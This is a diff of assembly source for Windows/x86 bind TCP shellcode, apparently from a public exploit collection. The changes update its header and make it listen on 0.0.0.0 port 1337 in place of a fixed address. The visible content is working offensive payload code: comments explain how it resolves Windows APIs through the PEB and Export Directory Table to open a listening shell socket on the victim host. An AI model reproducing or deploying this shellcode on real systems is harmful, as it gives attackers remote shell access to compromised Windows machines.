@@ -1,10 +1,10 @@
-; Name: Windows/x86 - Bind TCP shellcode / Dynamic Null-Byte Free PEB & EDT method (419 bytes)
+; Name: Windows/x86 - Bind TCP shellcode / Dynamic PEB & EDT method null-free (415 bytes)
 ; Author: h4pp1n3ss
-; Date: Mon 10/05/2021
+; Date: Wed 10/06/2021
 ; Tested on: Microsoft Windows [Version 10.0.19042.1237]
 
 ; Description: 
-; This a bind tcp shellcode that open a listen socket on port 1337. In order to accomplish this task the shellcode uses
+; This a bind tcp shellcode that open a listen socket on 0.0.0.0 and port 1337. In order to accomplish this task the shellcode uses
 ; the PEB method to locate the baseAddress of the required module and the Export Directory Table to locate symbols. 
 ; Also the shellcode uses a hash function to gather dynamically the required symbols without worry about the length. 
 
@@ -157,7 +157,7 @@ resolve_symbols_ws2_32:
  create_sockaddr_in_struct:         ; sockaddr_in {AF_INET = 2; p1337 = 0x3905; INADDR_ANY = 0x5D00A8C0}
     mov   esi, eax                  ; Move the SOCKET descriptor to ESI
     xor   eax, eax                  ; EAX = Null
-    push 0xdf0c10ac                 ; Push sin_addr (e.g: 172.16.12.223)             
+    push eax                        ; Push sin_addr (any address 0.0.0.0)
     mov ax, 0x3905                  ; Move the sin_port (example: 1337) to AX (EAX = 0x00003905)   
     shl   eax, 0x10                 ; Left shift EAX by 0x10 bytes (EAX = 0x39050000)
     add   ax, 0x02                  ; Add 0x02 (AF_INET) to AX
